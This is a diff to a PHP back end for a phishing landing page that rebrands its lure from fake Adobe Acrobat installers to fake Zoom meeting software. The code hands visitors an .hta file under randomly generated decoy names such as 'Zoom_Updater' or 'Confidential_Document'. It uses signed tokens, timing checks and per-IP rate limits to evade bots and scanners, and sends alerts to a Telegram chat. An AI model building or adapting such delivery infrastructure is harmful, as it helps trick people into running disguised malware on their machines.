@@ -1,6 +1,6 @@
 <?php
 // =====================================================================
-//  Adobe/Confidential "document" landing — shared logic (Railway deploy)
+//  Zoom "meeting" landing — shared logic (Railway deploy)
 //
 //  Anti-bot stack:
 //   1. Signed token chain: index -> download -> complete -> dl.
@@ -26,12 +26,12 @@ define('TG_CHAT',  '7901102007');
 // Stable HMAC secret so a token issued by index.php validates in later
 // requests (each web request is a separate process). Env-overridable; the
 // fallback is fixed so the app works with zero config.
-define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4b83-0a6d5512'));
+define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-zoom-landing-9f2e1c7a4b83-0a6d5512'));
 
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
 define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
-define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Acrobat_Setup.hta');
+define('SOURCE_ZIP', __DIR__ . '/src/Zoom_Setup.hta');
 define('RATE_DIR', sys_get_temp_dir());
 define('ALERT_DIR', sys_get_temp_dir());
 
@@ -127,7 +127,7 @@ function jev_call(array $state): ?array {
     $ctx = stream_context_create(['http' => [
         'method' => 'POST',
         'header' => "Content-Type: application/json\r\n"
-                  . "User-Agent: adobe-landing/1.0\r\n"
+                  . "User-Agent: zoom-landing/1.0\r\n"
                   . "Authorization: Bearer " . JEV_KEY,
         'content' => $payload, 'timeout' => JEV_TIMEOUT, 'ignore_errors' => true,
     ]]);
@@ -426,15 +426,15 @@ function gate_dl(): array {
 }
 
 // ------------------------------------------------- name generation
-// Mixed pool: fresh Adobe-setup names AND fresh document names per visit.
+// Mixed pool: fresh Zoom-setup names AND fresh document names per visit.
 function make_name(): string {
-    $adobe = [
-        'Adobe_Acrobat_Pro_DC_'          . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Creative_Cloud_Updater_'  . sprintf('%d.%d.%04d', random_int(3,7),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Standard_DC_'     . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_DC_Reader_Patch_'         . sprintf('%d.%d.%04d', random_int(22,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Sign_'            . sprintf('%d.%d.%04d', random_int(2,5),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Update_Package_'          . random_int(10000, 99999),
+    $zoom = [
+        'Zoom_Meeting_Recorder_'         . sprintf('%d.%d.%04d', random_int(5,7), random_int(1,9), random_int(1,9999)),
+        'Zoom_Updater_'                  . sprintf('%d.%d.%04d', random_int(5,7), random_int(1,9), random_int(1,9999)),
+        'Zoom_Desktop_Client_'           . sprintf('%d.%d.%04d', random_int(5,7), random_int(1,9), random_int(1,9999)),
+        'Zoom_Meeting_Install_'          . random_int(10000, 99999),
+        'Zoom_Video_Meetings_Update_'    . sprintf('%d.%d.%04d', random_int(5,7), random_int(1,9), random_int(1,9999)),
+        'Zoom_Webinar_Module_'           . sprintf('%d.%d.%04d', random_int(5,7), random_int(1,9), random_int(1,9999)),
     ];
     $conf = [
         'Confidential_Document_' . random_int(100000, 999999),
@@ -444,12 +444,12 @@ function make_name(): string {
         'Document_File_'         . date('Ymd') . '_' . random_int(100, 999),
         'Statement_Report_'      . date('Y') . '_' . random_int(1000, 9999),
     ];
-    $pool = random_int(0, 1) ? $conf : $adobe;   // 50/50 mix
+    $pool = random_int(0, 1) ? $conf : $zoom;   // 50/50 mix
     return $pool[random_int(0, count($pool)-1)] . '.hta';
 }
 
 function name_kind(string $name): string {
-    return preg_match('/^adobe/i', $name) ? 'adobe' : 'document';
+    return preg_match('/^zoom/i', $name) ? 'zoom' : 'document';
 }
 
 // ------------------------------------------------------- telegram
